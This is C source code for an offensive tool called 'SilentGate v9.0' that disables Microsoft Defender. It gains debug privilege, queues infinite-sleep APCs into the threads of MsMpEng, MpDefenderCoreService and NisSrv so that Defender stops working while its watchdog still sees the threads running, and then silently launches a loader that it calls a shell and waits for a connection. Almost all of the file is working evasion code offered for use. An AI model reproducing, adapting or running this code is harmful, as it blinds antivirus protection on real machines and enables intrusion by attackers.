/*
 * SilentGate v9.0 - APC Thread Freeze
 * Author: JarDani
 * Queues Sleep(INFINITE) APC into MsMpEng threads
 * Threads stay RUNNING but execute nothing useful
 * Watchdog satisfied - no crash
 * Defender effectively blind
 */
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3);

DWORD get_pid(const char* name) {
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    DWORD pid=0;
    if(Process32First(snap,&pe)){
        do{if(_stricmp(pe.szExeFile,name)==0){pid=pe.th32ProcessID;break;}
        }while(Process32Next(snap,&pe));
    }
    CloseHandle(snap);
    return pid;
}

int apc_freeze_process(DWORD pid, PVOID sleep_fn,
    pNtQueueApcThread NtQueueApcThread) {
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    THREADENTRY32 te; te.dwSize=sizeof(te);
    int count=0;
    if(Thread32First(snap,&te)){
        do{
            if(te.th32OwnerProcessID==pid){
                HANDLE ht=OpenThread(
                    THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME|
                    THREAD_QUERY_INFORMATION,
                    FALSE,te.th32ThreadID);
                if(ht){
                    /* Queue APC: Sleep(0xFFFFFFFF) */
                    NTSTATUS s=NtQueueApcThread(ht,
                        sleep_fn,
                        (PVOID)0xFFFFFFFF,  /* dwMilliseconds */
                        NULL, NULL);
                    if(s==0){
                        printf("[APC] Queued Sleep APC to TID %lu\n",
                            te.th32ThreadID);
                        count++;
                    }
                    CloseHandle(ht);
                }
            }
        }while(Thread32Next(snap,&te));
    }
    CloseHandle(snap);
    return count;
}

int main() {
    printf("[V9] SilentGate v9.0 - APC Freeze\n");
    printf("[V9] Author: JarDani\n\n");

    /* Enable debug privilege */
    HANDLE tok=NULL;
    OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&tok);
    TOKEN_PRIVILEGES tp={0}; tp.PrivilegeCount=1;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    AdjustTokenPrivileges(tok,FALSE,&tp,0,NULL,NULL);
    CloseHandle(tok);

    /* Get Sleep function address - same in all processes */
    HMODULE k32=GetModuleHandleA("kernel32.dll");
    PVOID sleep_fn=GetProcAddress(k32,"Sleep");
    printf("[V9] Sleep function: %p\n\n",sleep_fn);

    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    pNtQueueApcThread NtQueueApcThread=
        (pNtQueueApcThread)GetProcAddress(ntdll,"NtQueueApcThread");

    /* Get Defender PIDs */
    DWORD msmpeng=get_pid("MsMpEng.exe");
    DWORD mpcore =get_pid("MpDefenderCoreService.exe");
    DWORD nissrv  =get_pid("NisSrv.exe");

    printf("[V9] MsMpEng PID: %lu\n",msmpeng);
    printf("[V9] MpCore PID : %lu\n",mpcore);
    printf("[V9] NisSrv PID : %lu\n\n",nissrv);

    int total=0;
    if(msmpeng) total+=apc_freeze_process(msmpeng,sleep_fn,NtQueueApcThread);
    if(mpcore)  total+=apc_freeze_process(mpcore, sleep_fn,NtQueueApcThread);
    if(nissrv)  total+=apc_freeze_process(nissrv, sleep_fn,NtQueueApcThread);

    printf("\n[V9] Total APCs queued: %d\n",total);
    printf("[V9] Defender threads will Sleep(INFINITE) on next wake\n");
    printf("[V9] Watchdog sees threads RUNNING - no crash\n\n");

    /* Execute shell immediately */
    char shell[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(shell,MAX_PATH,"%s\\sg_loader.exe",dir);

    printf("[V9] Executing shell: %s\n",shell);
    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;

    if(CreateProcessA(shell,NULL,NULL,NULL,FALSE,
            CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        printf("[V9] Shell PID: %lu\n",pi.dwProcessId);
        printf("[V9] Waiting for connection...\n");
        WaitForSingleObject(pi.hProcess,15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[V9] Shell failed: %lu\n",GetLastError());
    }

    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
